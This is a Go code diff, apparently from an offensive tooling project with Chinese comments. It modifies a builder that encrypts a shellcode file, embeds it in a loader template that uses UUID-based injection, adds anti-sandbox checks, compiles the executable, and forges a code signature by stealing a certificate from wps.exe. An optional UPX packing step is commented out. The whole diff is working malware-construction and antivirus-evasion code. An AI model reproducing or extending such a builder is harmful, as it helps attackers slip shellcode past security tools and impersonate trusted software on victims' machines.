@@ -15,47 +15,62 @@ func main() {
 	// 反沙箱模块
 	sandbox := render.SandBox{
 		Methods: []string{
-			"sandbox.BootTime()",
-			"sandbox.GetDesktopFiles()",
+			"sandbox.BootTime",
+			"sandbox.GetDesktopFiles",
 		}}
 
 	// 压缩算法模块
-	compressor := render.Compressor{
-		Import:    "variant/compress",
-		Algorithm: "compress.LzwDecompress",
-		Ratio:     8,
-	}
+	//compressor := render.Compressor{
+	//	Import:    "variant/compress",
+	//	Algorithm: "compress.LzwDecompress",
+	//	Ratio:     8,
+	//}
 
-	// 定义模板渲染数据
-	data := render.Data{
-		KeyName:    rand.RStrings(),
-		KeyValue:   rand.LStrings(16),
-		IvName:     rand.RStrings(),
-		IvValue:    rand.LStrings(16),
-		CipherText: rand.RStrings(),
-		PlainText:  rand.RStrings(),
-		Decrypt:    "XorSm4HexBase85Decrypt",
-		Loader:     "HalosGate",
-		Compressor: compressor,
-		SandBox:    sandbox,
+	local := render.Local{
+		KeyName:  rand.RStrings(),
+		KeyValue: rand.LStrings(16),
+		IvName:   rand.RStrings(),
+		IvValue:  rand.LStrings(16),
 	}
 
 	// 设置加密参数
 	params := enc.Payload{
 		PlainText: "render/templates/payload.bin",
-		Key:       []byte(data.KeyValue),
-		IV:        []byte(data.IvValue),
+		FileName:  rand.RStrings(),
+		Path:      "output",
+		Key:       []byte(local.KeyValue),
+		IV:        []byte(local.IvValue),
 	}
 	// 加密之后的 shellcode
-	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
+	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
 	if err != nil {
 		log.Fatal(err)
 	}
-	data.Payload = tmp
+
+	args := render.Args{
+		Import:  "os",
+		ArgsKey: "kkk",
+	}
+
+	loader := render.Loader{
+		Method: "loader.UuidFromString",
+	}
+
+	// 定义模板渲染数据
+	data := render.Data{
+		CipherText:    rand.RStrings(),
+		PlainText:     rand.RStrings(),
+		DecryptMethod: "crypto.XorAesHexBase85Decrypt",
+		Local:         local,
+		SandBox:       sandbox,
+		Payload:       payload,
+		Loader:        loader,
+		Args:          args,
+	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/base.tmpl",
+		TmplFile:     "render/templates/v3/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
@@ -73,6 +88,7 @@ func main() {
 		HideConsole: false,
 		CompilePath: "output",
 	}
+
 	// 编译
 	if err = cOpts.Compile(); err != nil {
 		log.Fatal(err)
@@ -88,17 +104,17 @@ func main() {
 	sOpts := build.SignOpts{
 		SignPath: "output",
 		UnSign:   cOpts.ExeFileName,
-		Signed:   "signed_" + cOpts.ExeFileName,
+		Signed:   fmt.Sprintf("signed_%s", cOpts.ExeFileName),
 		Cert:     "wps.der",
 		Thief:    "wps.exe",
 		DstCert:  "wps.der",
 	}
 
 	// 保存证书
-	err = sOpts.SaveCert()
-	if err != nil {
-		log.Fatal(err)
-	}
+	//err = sOpts.SaveCert()
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
 
 	// 利用EXE进行签名伪造
 	err = sOpts.ExeThief()
@@ -113,18 +129,18 @@ func main() {
 	//}
 
 	// 压缩参数
-	upx := build.UpxOpts{
-		Level:   "--lzma",
-		Keep:    true,
-		Force:   true,
-		SrcExe:  cOpts.ExeFileName,
-		UpxPath: "output",
-	}
+	//upx := build.UpxOpts{
+	//	Level:   "--lzma",
+	//	Keep:    true,
+	//	Force:   true,
+	//	SrcExe:  sOpts.Signed,
+	//	UpxPath: "output",
+	//}
 
-	// 压缩
-	err = upx.UpxPacker()
-	if err != nil {
-		log.Warn(err)
-	}
+	// 执行压缩
+	//err = upx.UpxPacker()
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
 
 }
